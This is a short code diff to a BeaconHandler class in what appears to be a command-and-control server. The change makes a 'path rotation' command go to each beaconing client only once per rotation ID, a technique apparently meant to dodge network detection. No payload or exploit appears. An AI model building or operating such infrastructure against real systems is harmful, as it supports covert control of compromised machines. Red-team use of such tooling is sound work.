@@ -284,9 +284,21 @@ class BeaconHandler(BaseHandler):
         
         # Add path rotation command if needed for established clients
         if include_rotation_info and not first_contact:
-            path_rotation_command = self.path_router.create_path_rotation_command()
-            commands.append(path_rotation_command)
-            self.log_message(f"Sending path rotation info to client {client_id}")
+            rotation_info = self.path_router.get_rotation_info()
+            rotation_id = rotation_info["current_rotation_id"]
+            
+            # Check if the client has already been sent this rotation
+            client_info = self.client_manager.clients.get(client_id, {})
+            last_rotation_sent = client_info.get("last_rotation_sent", 0)
+            
+            if rotation_id > last_rotation_sent:
+                # Only send rotation if it's newer
+                path_rotation_command = self.path_router.create_path_rotation_command()
+                commands.append(path_rotation_command)
+                
+                # Update the client's last_rotation_sent
+                self.client_manager.clients[client_id]["last_rotation_sent"] = rotation_id
+                self.log_message(f"Sending path rotation info (ID: {rotation_id}) to client {client_id}")
         
         # Log commands being sent
         for command in commands:
